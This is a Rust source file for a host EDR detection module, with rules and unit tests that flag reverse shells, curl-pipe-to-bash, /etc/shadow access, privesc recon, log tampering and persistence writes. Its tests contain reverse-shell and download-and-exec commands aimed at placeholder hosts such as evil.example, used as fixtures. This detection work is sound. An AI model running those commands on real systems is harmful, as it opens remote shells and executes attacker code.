//! host_edr — deterministic, first-tier HOST exec + persistence detection heuristics.
//!
//! **Closes the EDR audit CRITICAL finding**: `host-telemetry` (execsnoop / the `/proc`-polling
//! fallback) + `fanotify` were OBSERVATION-only — every process exec and file write became a
//! `processes`/`files` node, but nothing ever turned a malicious one into a `detections` row, so a
//! reverse shell or a persistence dropper was logged-and-queryable but never alerted, scored, or
//! correlated into an incident. This module is the ruleset; [`crate::EvidenceGraph::ingest_host_event`]
//! is the seam that calls it for every "process"/"file" event, so BOTH host-telemetry producers
//! (the eBPF execsnoop loader and the `/proc`-polling shell-script fallback — see
//! `base/scripts/host-telemetry-start.sh`, they emit the identical JSON contract) and the fanotify
//! file-write producer get the SAME detections for free, with no duplicated logic in either loader.
//!
//! Pure, dependency-free, deterministic pattern matching — **no ML in the enforcement path** (C9):
//! every function here is a plain `&str` → `Option`/`Vec` classifier, unit-tested below with zero
//! I/O, so `cargo test -p hookprobe-evidence` exercises the exact ruleset the timer-driven ingest
//! path runs in production.
//!
//! ## rule_id band
//! A FRESH, unused range — checked 2026-07-05 against every `rule_id`/`RULE_ID` constant in the
//! workspace (`modules/napse` 1_000_001..=1_000_025, `napse-capture::l2guard` 1_000_030..=1_000_033,
//! the supply-chain bands `9_1xx_xxx`/`9_2xx_xxx`): **`1_000_100..=1_000_115`** is host-EDR's own,
//! sub-banded exec (`1_000_10x`) vs persistence (`1_000_11x`) so the two families never collide as
//! either grows.
//!
//! ## Honest scope (state plainly — do not let "EDR" overclaim)
//! This is a FIRST host-EDR tier: deterministic exec-pattern heuristics + a curated persistence-path
//! watchlist, wired into the SAME correlation/attack-path machinery the network detectors already
//! use. It explicitly does **not** cover:
//!   - **in-memory injection** (process hollowing, DLL/so injection, ptrace-based code injection) —
//!     needs a ptrace/LSM/eBPF-uprobe sensor that doesn't exist in this OS yet;
//!   - **credential theft** (LSASS-equivalent memory scraping, keychain/keyring access monitoring) —
//!     no such sensor is wired here (the `credentials` node table exists in the schema but nothing
//!     populates it from a real sensor yet);
//!   - **kernel-level rootkits** — needs boot/kernel-module integrity measurement, not an exec/file
//!     stream;
//!   - **full lateral-movement** — needs cross-device session/auth correlation beyond what one
//!     host's exec/file telemetry can see (the network layer's `T1021`/`lateral_movement` detections
//!     are the current lateral-movement signal; this module does not add a host-side one).
//!
//! Any UI/doc surfacing this MUST say "host exec + persistence heuristics + correlation", never
//! "full EDR" — the gaps above are real and unaddressed by this tier.

/// Suricata severity convention (matches every other rule_id band in this workspace):
/// 1=CRITICAL 2=HIGH 3=MEDIUM 4=LOW 5=INFO.
pub const SEV_CRITICAL: i64 = 1;
pub const SEV_HIGH: i64 = 2;
pub const SEV_MEDIUM: i64 = 3;

// ---- exec-pattern rule_ids (1_000_10x) --------------------------------------------------------
/// LOLBin / reverse-shell / interactive-shell-via-socket exec pattern (e.g. `bash -i` redirected to
/// `/dev/tcp`, `nc -e`, a python/perl/ruby one-liner wiring a socket to a shell).
pub const REVERSE_SHELL_RULE_ID: i64 = 1_000_100;
/// Download-and-exec: `curl`/`wget`/`base64 -d` output piped straight into a shell interpreter.
pub const DOWNLOAD_EXEC_RULE_ID: i64 = 1_000_101;
/// A network/service daemon (nginx, mysqld, redis-server, …) spawned a shell/interpreter — the
/// classic RCE tell (a legitimate daemon has no business forking `/bin/sh`).
pub const SUSPICIOUS_PARENTAGE_RULE_ID: i64 = 1_000_102;
/// Exec of a binary staged in a world-writable / staging directory (`/tmp`, `/var/tmp`,
/// `/dev/shm`, …) — where a dropped payload is executed from.
pub const EXEC_FROM_WRITABLE_PATH_RULE_ID: i64 = 1_000_103;

// ---- persistence-path rule_ids (1_000_11x) ----------------------------------------------------
/// Write to a cron table / cron.d / cron.{hourly,daily,weekly,monthly} spool.
pub const CRON_PERSISTENCE_RULE_ID: i64 = 1_000_110;
/// Write to a systemd unit directory (system or user).
pub const SYSTEMD_PERSISTENCE_RULE_ID: i64 = 1_000_111;
/// Write to an `authorized_keys` file (any user's `~/.ssh/authorized_keys`).
pub const SSH_AUTHKEYS_PERSISTENCE_RULE_ID: i64 = 1_000_112;
/// Write to `/etc/ld.so.preload` (dynamic-linker hijack — every new process silently loads it).
pub const LD_PRELOAD_PERSISTENCE_RULE_ID: i64 = 1_000_113;
/// Write to a shell profile/rc script (`.bashrc`, `/etc/profile`, `/etc/profile.d/…`, …).
pub const SHELL_PROFILE_PERSISTENCE_RULE_ID: i64 = 1_000_114;
/// Write to `/etc/passwd` or `/etc/shadow` (account creation/modification via direct file write).
pub const PASSWD_SHADOW_PERSISTENCE_RULE_ID: i64 = 1_000_115;

// ---- 2026-07-07 coverage extension (credential access / privesc recon / defense evasion) ------
// Continues the SAME `1_000_1xx` band immediately after the persistence family above (checked
// 2026-07-07 against every `RULE_ID`/rule_id constant in the workspace: `modules/napse`
// 1_000_001..=1_000_025, `napse-capture::portscan` additionally now owns 1_000_012,
// `napse-capture::l2guard` 1_000_030..=1_000_033 — none collide with 1_000_116..=1_000_118).
// All three reuse the EXISTING exec-argv path (`classify_exec`) — none needs a new sensor: the
// host-telemetry execsnoop loader already captures name/cmdline/parent for every exec, which is
// all these three techniques need to see.

/// Access to `/etc/shadow` (or `/etc/gshadow`) from something OTHER than the passwd/PAM/account
/// toolchain — direct reads (`cat`/`strings`/`head`/`tail`/`cp`) or an `unshadow`/`john`/`hashcat`
/// combo-file attack referencing it. See `classify_exec`'s FP analysis for why requiring the
/// literal path in argv already excludes the legitimate toolchain in the common case.
pub const CREDENTIAL_ACCESS_SHADOW_RULE_ID: i64 = 1_000_116;
/// Privilege-escalation reconnaissance: `sudo -l`/`sudo -ll` enumeration, a `find … -perm -4000`
/// (or `-6000`) SUID/SGID sweep, or a bare `pkexec` invocation with no target command (the
/// PwnKit/CVE-2021-4034 IOC — see `classify_exec`'s doc for why a bare invocation is the tell).
pub const PRIVESC_RECON_RULE_ID: i64 = 1_000_117;
/// Defense evasion via log/shell-history tampering: `rm`/`truncate`/output-redirection onto
/// `/var/log/*`, `history -c`, or `unset HISTFILE`.
pub const LOG_TAMPERING_RULE_ID: i64 = 1_000_118;

/// One host-EDR finding, ready to become a `detections` row exactly like a network detection —
/// same fields `EvidenceGraph::insert_host_detection` writes into the SAME `detections` table
/// `ingest_detection` writes into, so host and network detections on the same device correlate
/// into ONE incident (`correlate_all`/`correlate_incident` already group by `src_ip` with no
/// per-source-type branching — see `attack_path_spans_network_and_host_layers` for the existing
/// proof this crate's schema already unifies the two layers).
#[derive(Debug, Clone, PartialEq)]
pub struct HostDetection {
    pub rule_id: i64,
    pub rule_msg: String,
    pub category: &'static str,
    pub mitre: &'static str,
    pub severity: i64,
    pub confidence: f64,
}

/// Env-tunable ruleset knobs (read once per `ingest_host_event` call — negligible next to the
/// JSON-parse + SQLite work already done per line). Kept as explicit, passed-in config (not a
/// hidden global) so unit tests below stay deterministic and parallel-safe: they build a
/// `HostEdrConfig` directly instead of mutating process-wide env vars.
#[derive(Debug, Clone, PartialEq)]
pub struct HostEdrConfig {
    /// Lowercase substrings of a PARENT process name that count as a "network/service daemon" for
    /// the suspicious-parentage check. Deliberately excludes general-purpose runtimes (`java`,
    /// `node`, `python`) and `sshd` — `sshd` spawning a shell is its NORMAL job (every interactive
    /// SSH login), not an RCE tell, and a build/app runtime shelling out is common+benign. Override
    /// via `HOOKPROBE_EDR_DAEMON_LIST` (comma-separated) to widen coverage for an operator's own
    /// app-server fleet, at the cost of more noise.
    pub daemon_names: Vec<String>,
    /// Lowercase names/substrings of a CHILD process that count as "a shell/interpreter" for the
    /// same check. Override via `HOOKPROBE_EDR_SHELL_LIST`.
    pub shell_names: Vec<String>,
    /// Path prefixes considered world-writable/staging areas for the exec-from-writable-path check.
    /// Override via `HOOKPROBE_EDR_WRITABLE_PREFIXES`.
    pub writable_prefixes: Vec<String>,
    /// Lowercase substrings of a process NAME that count as the legitimate passwd/PAM/account
    /// toolchain — exec of one of these is never flagged by the credential-access-to-shadow check
    /// even if its argv happens to spell out `/etc/shadow` (e.g. a manual `vipw -s /etc/shadow`
    /// sysadmin edit). Override/extend via `HOOKPROBE_EDR_SHADOW_TOOL_ALLOWLIST`.
    pub shadow_tool_allowlist: Vec<String>,
    /// Lowercase substrings of a PARENT process name allowed to run `sudo -l` without tripping the
    /// privesc-recon check — config-management/automation agents (Ansible's `become` probe,
    /// Chef/Puppet/Salt bootstrap, cloud-init, SSM) legitimately do this as routine bootstrap, not
    /// recon. Override via `HOOKPROBE_EDR_PRIVESC_ALLOWLIST`.
    pub privesc_recon_allowlist: Vec<String>,
    /// Lowercase substrings of a process NAME that legitimately truncate/rotate/clear log files as
    /// their designed job (logrotate's `copytruncate` mode literally calls `truncate()` on log
    /// files) — excluded from the log-tampering check by NAME (not parent), since these tools do
    /// the truncating themselves. Override via `HOOKPROBE_EDR_LOG_TOOL_ALLOWLIST`.
    pub log_tool_allowlist: Vec<String>,
}

fn env_list(var: &str, default: Vec<String>) -> Vec<String> {
    match std::env::var(var) {
        Ok(s) if !s.trim().is_empty() => s
            .split(',')
            .map(|p| p.trim().to_ascii_lowercase())
            .filter(|p| !p.is_empty())
            .collect(),
        _ => default,
    }
}

impl HostEdrConfig {
    pub fn from_env() -> Self {
        Self {
            daemon_names: env_list("HOOKPROBE_EDR_DAEMON_LIST", Self::default_daemons()),
            shell_names: env_list("HOOKPROBE_EDR_SHELL_LIST", Self::default_shells()),
            writable_prefixes: env_list("HOOKPROBE_EDR_WRITABLE_PREFIXES", Self::default_writable_prefixes()),
            shadow_tool_allowlist: env_list("HOOKPROBE_EDR_SHADOW_TOOL_ALLOWLIST", Self::default_shadow_tools()),
            privesc_recon_allowlist: env_list("HOOKPROBE_EDR_PRIVESC_ALLOWLIST", Self::default_privesc_allowlist()),
            log_tool_allowlist: env_list("HOOKPROBE_EDR_LOG_TOOL_ALLOWLIST", Self::default_log_tools()),
        }
    }

    fn default_daemons() -> Vec<String> {
        [
            "nginx", "apache2", "httpd", "php-fpm", "mysqld", "mariadbd", "postgres", "postgresql",
            "redis-server", "mongod", "tomcat", "gunicorn", "uwsgi", "vsftpd", "proftpd", "exim",
            "postfix", "dovecot", "smbd", "nmbd",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect()
    }

    fn default_shells() -> Vec<String> {
        [
            "sh", "bash", "dash", "zsh", "ash", "ksh", "csh", "tcsh", "nc", "ncat", "python",
            "python3", "perl", "ruby", "socat",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect()
    }

    fn default_writable_prefixes() -> Vec<String> {
        ["/tmp/", "/var/tmp/", "/dev/shm/", "/run/shm/"]
            .iter()
            .map(|s| s.to_string())
            .collect()
    }

    fn default_shadow_tools() -> Vec<String> {
        [
            "passwd", "chpasswd", "useradd", "userdel", "usermod", "chage", "chsh", "chfn", "login",
            "sshd", "sudo", "su", "unix_chkpwd", "vipw", "pwck", "grpck", "newusers", "gpasswd",
            "groupadd", "groupdel", "groupmod", "nscd", "sss_cache", "systemd-logind", "polkitd",
            "cracklib-check",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect()
    }

    fn default_privesc_allowlist() -> Vec<String> {
        [
            "ansible", "ansible-playbook", "chef-client", "puppet", "puppet-agent", "salt-minion",
            "cloud-init", "ssm-agent", "amazon-ssm-agent",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect()
    }

    fn default_log_tools() -> Vec<String> {
        ["logrotate", "journalctl", "systemd-journald", "systemd-tmpfiles", "rsyslogd", "syslog-ng"]
            .iter()
            .map(|s| s.to_string())
            .collect()
    }
}

impl Default for HostEdrConfig {
    fn default() -> Self {
        Self {
            daemon_names: Self::default_daemons(),
            shell_names: Self::default_shells(),
            writable_prefixes: Self::default_writable_prefixes(),
            shadow_tool_allowlist: Self::default_shadow_tools(),
            privesc_recon_allowlist: Self::default_privesc_allowlist(),
            log_tool_allowlist: Self::default_log_tools(),
        }
    }
}

/// Evaluate one process-exec event against the deterministic exec ruleset. Returns EVERY pattern
/// that matched — a single exec can legitimately trip more than one (e.g. a webserver child running
/// a `curl|bash` one-liner is both "suspicious parentage" AND "download-and-exec"); an empty Vec
/// (the overwhelming majority of execs) means no match.
///
/// `parent_name` is the caller's best-effort lookup of the parent pid's own `name` from the
/// `processes` table (`None` if pid 0 / not yet observed) — the suspicious-parentage check is
/// skipped, not false-positived, when the parent is unknown.
pub fn classify_exec(name: &str, cmdline: &str, parent_name: Option<&str>, cfg: &HostEdrConfig) -> Vec<HostDetection> {
    let mut out = Vec::new();
    let cl = cmdline.to_ascii_lowercase();
    let nm = name.to_ascii_lowercase();

    // ---- 1. reverse-shell / interactive-shell-via-socket ---------------------------------------
    // `/dev/tcp/`|`/dev/udp/` (bash's fake-device TCP/UDP redirection) is virtually always a
    // reverse-shell idiom in a real exec line — there is no legitimate non-interactive use.
    // `bash -i`/`sh -i` forced from a non-tty invocation is the other half of the canonical
    // `bash -i >& /dev/tcp/ATTACKER/PORT 0>&1` one-liner. `nc -e`/`ncat --exec` is netcat's
    // execute-on-connect flag — many modern nc builds ship WITHOUT `-e` for exactly this reason.
    let reverse_shell_hit = cl.contains("/dev/tcp/")
        || cl.contains("/dev/udp/")
        || cl.contains("bash -i")
        || cl.contains("sh -i")
        || cl.contains("nc -e")
        || cl.contains("nc.traditional -e")
        || cl.contains("ncat -e")
        || cl.contains("ncat --exec")
        || ((cl.contains("python") || cl.contains("perl") || cl.contains("ruby"))
            && cl.contains("socket")
            && (cl.contains("subprocess") || cl.contains("dup2") || cl.contains("pty.spawn") || cl.contains("exec(")));
    if reverse_shell_hit {
        out.push(HostDetection {
            rule_id: REVERSE_SHELL_RULE_ID,
            rule_msg: format!("HookProbe Host-EDR: reverse-shell / interactive-shell-via-socket exec pattern ({name}: {cmdline})"),
            category: "host_reverse_shell",
            mitre: "T1059.004",
            severity: SEV_CRITICAL,
            confidence: 0.85,
        });
    }

    // ---- 2. download-and-exec ------------------------------------------------------------------
    // Honest false-positive note: a `curl … | bash` one-liner is ALSO how many legitimate install
    // scripts distribute themselves — that ambiguity is inherent to the technique (it is genuinely
    // risky behavior either way), not a bug in this detector; the operator's response workflow
    // (never auto-block on this alone) is expected to account for it.
    let has_fetch = cl.contains("curl ") || cl.starts_with("curl") || cl.contains("wget ") || cl.starts_with("wget");
    let has_b64 = cl.contains("base64 -d") || cl.contains("base64 --decode") || cl.contains("base64 -di");
    let pipes_to_interpreter = cl.contains("| sh") || cl.contains("|sh") || cl.contains("| bash") || cl.contains("|bash")
        || cl.contains("| python") || cl.contains("|python");
    if (has_fetch || has_b64) && pipes_to_interpreter {
        out.push(HostDetection {
            rule_id: DOWNLOAD_EXEC_RULE_ID,
            rule_msg: format!("HookProbe Host-EDR: download-and-exec pattern — fetched/decoded content piped straight to a shell ({name}: {cmdline})"),
            category: "host_download_exec",
            mitre: "T1105",
            severity: SEV_HIGH,
            confidence: 0.6,
        });
    }

    // ---- 3. suspicious parent -> child (daemon spawning a shell/interpreter) -------------------
    if let Some(parent) = parent_name {
        let p = parent.to_ascii_lowercase();
        let is_daemon = cfg.daemon_names.iter().any(|d| p.contains(d.as_str()));
        let is_shell_child = cfg.shell_names.iter().any(|s| nm == s.as_str() || nm.contains(s.as_str()));
        if is_daemon && is_shell_child {
            out.push(HostDetection {
                rule_id: SUSPICIOUS_PARENTAGE_RULE_ID,
                rule_msg: format!("HookProbe Host-EDR: service '{parent}' spawned shell/interpreter '{name}' — classic RCE tell"),
                category: "host_suspicious_parentage",
                mitre: "T1059",
                severity: SEV_CRITICAL,
                confidence: 0.75,
            });
        }
    }

    // ---- 4. exec from a world-writable / staging path -------------------------------------------
    // Only argv[0]/the resolved exec path (cmdline's first token) is checked — a shell doing
    // `cd /tmp && ./some/later/arg` must not false-positive on an unrelated later argument.
    let exec_path = cmdline.split_whitespace().next().unwrap_or("");
    if cfg.writable_prefixes.iter().any(|p| exec_path.starts_with(p.as_str())) {
        out.push(HostDetection {
            rule_id: EXEC_FROM_WRITABLE_PATH_RULE_ID,
            rule_msg: format!("HookProbe Host-EDR: exec from world-writable/staging path ({exec_path})"),
            category: "host_exec_from_writable_path",
            mitre: "T1059",
            severity: SEV_HIGH,
            confidence: 0.55,
        });
    }

    // ---- 5. credential access: /etc/shadow touched by something outside the passwd/PAM toolchain
    // FP analysis: the passwd/PAM/account-management toolchain (passwd, chpasswd, useradd, chage,
    // sshd, sudo, su, vipw, pwck, …) legitimately opens /etc/shadow as PART OF ITS JOB — none of
    // those tools normally carry the literal path "/etc/shadow" in their OWN argv (they resolve it
    // internally via getspnam()/PAM, not a command-line argument), so requiring the string to
    // appear in argv already excludes the overwhelming majority of legitimate traffic; the
    // `shadow_tool_allowlist` name check below is a second, belt-and-braces guard for the rare
    // case an admin invokes one of them with the path spelled out (e.g. a manual `vipw -s
    // /etc/shadow`-style edit). KNOWN, DOCUMENTED (not silently accepted) false positive: a
    // backup/config-mgmt job archiving `/etc/passwd`+`/etc/shadow` together (e.g. `tar czf
    // backup.tar.gz /etc/passwd /etc/shadow`) WILL fire — an operator running routine system
    // backups should add their backup tool's name to `HOOKPROBE_EDR_SHADOW_TOOL_ALLOWLIST`.
    let touches_shadow = cl.contains("/etc/shadow") || cl.contains("/etc/gshadow");
    let is_shadow_tool = cfg.shadow_tool_allowlist.iter().any(|t| nm.contains(t.as_str()));
    let is_shadow_cracker =
        (nm.contains("john") || nm.contains("hashcat") || nm.contains("unshadow")) && cl.contains("shadow");
    if (touches_shadow && !is_shadow_tool) || is_shadow_cracker {
        out.push(HostDetection {
            rule_id: CREDENTIAL_ACCESS_SHADOW_RULE_ID,
            rule_msg: format!(
                "HookProbe Host-EDR: /etc/shadow accessed outside the passwd/PAM toolchain ({name}: {cmdline})"
            ),
            category: "host_credential_access_shadow",
            mitre: "T1003.008",
            severity: SEV_CRITICAL,
            confidence: 0.75,
        });
    }

    // ---- 6. privilege-escalation reconnaissance --------------------------------------------------
    // FP analysis: `sudo -l` is also run by config-management agents checking their own grants
    // (Ansible's `become` probe, Chef/Puppet/Salt bootstrap, cloud-init, SSM) — allowlisted by
    // PARENT process name (`privesc_recon_allowlist`) rather than suppressed outright, so
    // interactive/attacker use over SSH still surfaces. Kept at MEDIUM confidence/severity for the
    // `sudo -l` case specifically (not CRITICAL) because a curious sysadmin legitimately checking
    // their own sudo rights is common, and this module — pure per-event pattern matching, no state
    // across calls (see the module doc) — cannot distinguish "curious admin" from "recon" from a
    // single exec's argv alone; that is a deliberate, documented scope limit, not a burst/rate
    // tracker like `napse-capture::portscan`'s trackers use.
    let is_sudo_l = nm.contains("sudo") && (cl.contains("sudo -l") || cl.contains("sudo -ll"));
    let is_suid_sweep = (nm.contains("find") || cl.starts_with("find "))
        && (cl.contains("-perm -4000")
            || cl.contains("-perm -6000")
            || cl.contains("-perm /4000")
            || cl.contains("-perm /6000")
            || cl.contains("-perm=4000")
            || cl.contains("-perm=6000"));
    // The PwnKit / CVE-2021-4034 IOC: `pkexec` invoked with NO further argv (the exploit's crafted
    // execve strips argv down to just the binary name) — a normal admin invocation always carries
    // a target command (`pkexec /usr/bin/some-tool …`).
    let trimmed_cl = cl.trim();
    let is_pkexec_anomaly =
        nm == "pkexec" && (trimmed_cl == "pkexec" || trimmed_cl == "/usr/bin/pkexec");
    let privesc_allowlisted = parent_name
        .map(|p| {
            let p = p.to_ascii_lowercase();
            cfg.privesc_recon_allowlist.iter().any(|a| p.contains(a.as_str()))
        })
        .unwrap_or(false);
    if (is_sudo_l || is_suid_sweep || is_pkexec_anomaly) && !privesc_allowlisted {
        let (detail, severity, confidence) = if is_pkexec_anomaly {
            ("bare pkexec invocation with no target command — PwnKit (CVE-2021-4034) IOC", SEV_HIGH, 0.7)
        } else if is_suid_sweep {
            ("SUID/SGID binary enumeration sweep", SEV_HIGH, 0.55)
        } else {
            ("sudo privilege enumeration (sudo -l)", SEV_MEDIUM, 0.35)
        };
        out.push(HostDetection {
            rule_id: PRIVESC_RECON_RULE_ID,
            rule_msg: format!("HookProbe Host-EDR: privilege-escalation recon — {detail} ({name}: {cmdline})"),
            category: "host_privesc_recon",
            mitre: "T1548.003",
            severity,
            confidence,
        });
    }

    // ---- 7. defense evasion: log / shell-history tampering ---------------------------------------
    // FP analysis: `logrotate` (including its `copytruncate` mode, which LITERALLY truncates log
    // files as its designed job) and the systemd-journal/syslog toolchain do exactly the actions
    // this rule watches for, as their normal function — excluded by `log_tool_allowlist` on the
    // PROCESS NAME itself (not the parent), since these tools do the truncating AS themselves, not
    // as a shell-spawned child of something else.
    let is_log_tool = cfg.log_tool_allowlist.iter().any(|t| nm.contains(t.as_str()));
    let first_tok = cl.split_whitespace().next().unwrap_or("");
    let first_base = first_tok.rsplit('/').next().unwrap_or(first_tok);
    let is_rm_or_truncate = first_base == "rm" || first_base == "truncate" || nm == "rm" || nm == "truncate";
    let is_log_redirect = cl.contains("> /var/log") || cl.contains(">/var/log");
    let targets_var_log = cl.contains("/var/log");
    let tampers_with_log_files = !is_log_tool && targets_var_log && (is_rm_or_truncate || is_log_redirect);
    let clears_shell_history = cl.contains("history -c")
        || cl.contains("history -cw")
        || cl.contains("unset histfile")
        || (cl.contains("bash_history") && (first_base == "rm" || cl.contains(">")));
    if tampers_with_log_files || clears_shell_history {
        out.push(HostDetection {
            rule_id: LOG_TAMPERING_RULE_ID,
            rule_msg: format!("HookProbe Host-EDR: possible log/history tampering ({name}: {cmdline})"),
            category: "host_log_tampering",
            mitre: "T1070",
            severity: SEV_HIGH,
            confidence: 0.6,
        });
    }

    out
}

/// Evaluate one file-write path (fanotify `FAN_CLOSE_WRITE`) against the curated persistence-path
/// watchlist. Returns at most one match — the listed paths are mutually exclusive by construction.
pub fn classify_persistence(path: &str) -> Option<HostDetection> {
    let p = path.to_ascii_lowercase();

    if p.ends_with("/.ssh/authorized_keys") || p.ends_with("/authorized_keys") {
        return Some(HostDetection {
            rule_id: SSH_AUTHKEYS_PERSISTENCE_RULE_ID,
            rule_msg: format!("HookProbe Host-EDR: write to SSH authorized_keys ({path}) — possible persistence via key injection"),
            category: "host_persistence_ssh_key",
            mitre: "T1098.004",
            severity: SEV_CRITICAL,
            confidence: 0.8,
        });
    }
    if p == "/etc/ld.so.preload" {
        return Some(HostDetection {
            rule_id: LD_PRELOAD_PERSISTENCE_RULE_ID,
            rule_msg: format!("HookProbe Host-EDR: write to {path} — dynamic-linker hijack (every new process silently loads it)"),
            category: "host_persistence_ld_preload",
            mitre: "T1574.006",
            severity: SEV_CRITICAL,
            confidence: 0.85,
        });
    }
    if p == "/etc/passwd" || p == "/etc/shadow" {
        return Some(HostDetection {
            rule_id: PASSWD_SHADOW_PERSISTENCE_RULE_ID,
            rule_msg: format!("HookProbe Host-EDR: direct write to {path} — possible account manipulation"),
            category: "host_persistence_account",
            mitre: "T1098",
            severity: SEV_CRITICAL,
            confidence: 0.7,
        });
    }
    if p.starts_with("/etc/cron") || p.starts_with("/var/spool/cron") {
        return Some(HostDetection {
            rule_id: CRON_PERSISTENCE_RULE_ID,
            rule_msg: format!("HookProbe Host-EDR: write to cron persistence path ({path})"),
            category: "host_persistence_cron",
            mitre: "T1053.003",
            severity: SEV_HIGH,
            confidence: 0.7,
        });
    }
    if p.starts_with("/etc/systemd/system/") || p.starts_with("/usr/lib/systemd/system/")
        || p.starts_with("/lib/systemd/system/") || p.contains("/.config/systemd/user/")
    {
        return Some(HostDetection {
            rule_id: SYSTEMD_PERSISTENCE_RULE_ID,
            rule_msg: format!("HookProbe Host-EDR: write to systemd unit path ({path}) — possible persistence via service/timer"),
            category: "host_persistence_systemd",
            mitre: "T1543.002",
            severity: SEV_HIGH,
            confidence: 0.65,
        });
    }
    if p.ends_with("/.bashrc") || p.ends_with("/.bash_profile") || p.ends_with("/.profile") || p.ends_with("/.zshrc")
        || p == "/etc/profile" || p.starts_with("/etc/profile.d/") || p == "/etc/bash.bashrc"
    {
        return Some(HostDetection {
            rule_id: SHELL_PROFILE_PERSISTENCE_RULE_ID,
            rule_msg: format!("HookProbe Host-EDR: write to shell profile/rc script ({path}) — possible persistence via login-shell hook"),
            category: "host_persistence_shell_profile",
            mitre: "T1546.004",
            severity: SEV_HIGH,
            confidence: 0.6,
        });
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg() -> HostEdrConfig {
        HostEdrConfig::default()
    }

    // ---- exec: reverse shell / LOLBin ----------------------------------------------------------

    #[test]
    fn detects_bash_dev_tcp_reverse_shell() {
        let dets = classify_exec("bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", None, &cfg());
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, REVERSE_SHELL_RULE_ID);
        assert_eq!(dets[0].mitre, "T1059.004");
        assert_eq!(dets[0].category, "host_reverse_shell");
    }

    #[test]
    fn detects_nc_exec_reverse_shell() {
        let dets = classify_exec("nc", "nc -e /bin/sh 10.0.0.1 4444", None, &cfg());
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, REVERSE_SHELL_RULE_ID);
    }

    #[test]
    fn detects_python_socket_shell() {
        let cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"1.2.3.4\",4444))'";
        let dets = classify_exec("python3", cmd, None, &cfg());
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, REVERSE_SHELL_RULE_ID);
    }

    #[test]
    fn detects_download_and_exec_curl_pipe_bash() {
        let dets = classify_exec("bash", "curl http://evil.example/payload.sh | bash", None, &cfg());
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, DOWNLOAD_EXEC_RULE_ID);
        assert_eq!(dets[0].mitre, "T1105");
    }

    #[test]
    fn detects_base64_piped_to_shell() {
        let dets = classify_exec("sh", "echo Y3VybCBldmls | base64 -d | sh", None, &cfg());
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, DOWNLOAD_EXEC_RULE_ID);
    }

    #[test]
    fn detects_suspicious_daemon_parentage() {
        let dets = classify_exec("bash", "/bin/bash", Some("nginx"), &cfg());
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, SUSPICIOUS_PARENTAGE_RULE_ID);
        assert_eq!(dets[0].mitre, "T1059");
    }

    #[test]
    fn sshd_spawning_a_shell_is_not_flagged() {
        // sshd spawning a login shell is NORMAL — every interactive SSH session does this. Must
        // NOT be in the default daemon list (would make every SSH login a false positive).
        let dets = classify_exec("bash", "-bash", Some("sshd"), &cfg());
        assert!(dets.is_empty(), "sshd->bash must not be flagged (that is sshd's designed behavior)");
    }

    #[test]
    fn unknown_parent_skips_parentage_check_without_false_positive() {
        let dets = classify_exec("bash", "/bin/bash", None, &cfg());
        assert!(dets.is_empty());
    }

    #[test]
    fn detects_exec_from_tmp() {
        let dets = classify_exec("payload", "/tmp/.hidden/payload --flag", None, &cfg());
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, EXEC_FROM_WRITABLE_PATH_RULE_ID);
    }

    #[test]
    fn detects_exec_from_dev_shm() {
        let dets = classify_exec("x", "/dev/shm/x", None, &cfg());
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, EXEC_FROM_WRITABLE_PATH_RULE_ID);
    }

    #[test]
    fn benign_exec_is_never_flagged() {
        let benign = [
            ("ls", "ls -la /home/user"),
            ("vim", "/usr/bin/vim notes.txt"),
            ("systemd", "/usr/lib/systemd/systemd --system"),
            ("apt", "apt-get update"),
            ("git", "git commit -m fix"),
        ];
        for (name, cmd) in benign {
            let dets = classify_exec(name, cmd, Some("bash"), &cfg());
            assert!(dets.is_empty(), "false positive on benign exec: {name} {cmd}");
        }
    }

    #[test]
    fn multiple_patterns_can_co_fire() {
        // a webserver child running a download-and-exec one-liner is BOTH findings — real signal,
        // not a bug, so both must surface as independent detections.
        let dets = classify_exec("bash", "curl http://evil/x.sh | bash", Some("nginx"), &cfg());
        let ids: Vec<i64> = dets.iter().map(|d| d.rule_id).collect();
        assert!(ids.contains(&DOWNLOAD_EXEC_RULE_ID));
        assert!(ids.contains(&SUSPICIOUS_PARENTAGE_RULE_ID));
    }

    #[test]
    fn daemon_list_is_env_tunable() {
        let mut c = cfg();
        c.daemon_names = vec!["myappserver".to_string()];
        let dets = classify_exec("sh", "/bin/sh", Some("myappserver"), &c);
        assert_eq!(dets.len(), 1);
        assert_eq!(dets[0].rule_id, SUSPICIOUS_PARENTAGE_RULE_ID);
    }

    // ---- persistence-path (fanotify file writes) ------------------------------------------------

    #[test]
    fn detects_authorized_keys_write() {
        let d = classify_persistence("/home/user/.ssh/authorized_keys").expect("must detect");
        assert_eq!(d.rule_id, SSH_AUTHKEYS_PERSISTENCE_RULE_ID);
        assert_eq!(d.mitre, "T1098.004");
    }

    #[test]
    fn detects_root_authorized_keys_write() {
        let d = classify_persistence("/root/.ssh/authorized_keys").expect("must detect");
        assert_eq!(d.rule_id, SSH_AUTHKEYS_PERSISTENCE_RULE_ID);
    }

    #[test]
    fn detects_ld_preload_write() {
        let d = classify_persistence("/etc/ld.so.preload").expect("must detect");
        assert_eq!(d.rule_id, LD_PRELOAD_PERSISTENCE_RULE_ID);
    }

    #[test]
    fn detects_crontab_write() {
        let d = classify_persistence("/etc/cron.d/evil").expect("must detect");
        assert_eq!(d.rule_id, CRON_PERSISTENCE_RULE_ID);
    }

    #[test]
    fn detects_systemd_unit_write() {
        let d = classify_persistence("/etc/systemd/system/evil.service").expect("must detect");
        assert_eq!(d.rule_id, SYSTEMD_PERSISTENCE_RULE_ID);
    }

    #[test]
    fn detects_shell_profile_write() {
        let d = classify_persistence("/root/.bashrc").expect("must detect");
        assert_eq!(d.rule_id, SHELL_PROFILE_PERSISTENCE_RULE_ID);
    }

    #[test]
